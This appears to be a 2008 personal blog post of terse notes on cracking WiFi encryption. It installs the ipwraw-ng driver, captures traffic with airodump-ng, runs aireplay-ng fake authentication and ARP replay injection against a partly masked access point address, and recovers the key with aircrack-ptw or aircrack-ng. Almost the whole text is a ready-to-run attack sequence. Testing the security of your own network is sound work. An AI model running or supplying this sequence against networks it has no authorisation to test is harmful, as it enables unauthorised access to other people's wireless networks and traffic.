---
title: "wifi security :-("
slug: wifi-security
date: 2008-02-24 19:26 +0100
year: "2008"
description: "Notes on testing wifi security with the ipwraw-ng driver and the aircrack-ng suite: swapping drivers, capturing with airodump-ng and injecting with aireplay-ng."
---

Cracking.... Using http://aircrack-ng.org/doku.php?id=ipw3945 (it uses ipwraw-ng http://homepages.tu-darmstadt.de/~p_larbig/wlan/).

```bash
cd /home/jfclere/modem/wifi/ipwraw-ng
make
make install
make install_ucode
```

Remove the old driver:

```text
[root@jfcpc ipwraw-ng]# /sbin/lsmod | grep 39
ipw3945               181024  0
ieee80211              30985  1 ipw3945
[root@jfcpc ipwraw-ng]# /sbin/rmmod ipw3945
[root@jfcpc ipwraw-ng]# /etc/rc.d/init.d/ipw3945d stop
Stopping ipw3945d:                                         [  OK  ]
```

Load the new one:

```bash
/sbin/modprobe ipwraw
```

Start it up:

```bash
/sbin/ifconfig wifi0 up
/sbin/iwconfig wifi0 rate 1M
```

Set the right channel, for example:

```bash
/sbin/iwconfig wifi0 chan 1
```

kismet too: edit /etc/kismet/kismet.conf and add:

```text
source=ipw3945,wifi0,wifi0
```

Start capture (to get the file.cap):

```bash
/usr/sbin/airodump-ng -c 11 --bssid 00:C0:49:F1:XX:XX -w XXXX rtap0
```

Use a test to check it will work:

```bash
/usr/sbin/aireplay-ng -9 wifi0 -b 00:C0:49:F1:XX:XX
```

Use fakeauth (-1) to check the AP likes us:

```bash
/usr/sbin/aireplay-ng -1 0 -e XXXX -a 00:C0:49:F1:XX:XX -h 00:19:D2:AE:3B:9D wifi0
```

Use -3 of aireplay-ng to inject (it takes time to get ARP packets):

```bash
/usr/sbin/aireplay-ng -3 -b 00:C0:49:F1:XX:XX -h 00:19:D2:AE:3B:9D wifi0
```

The last step is:

```bash
aircrack-ptw file.cap
```

If it doesn't work try the slower:

```bash
aircrack-ng file.cap
```
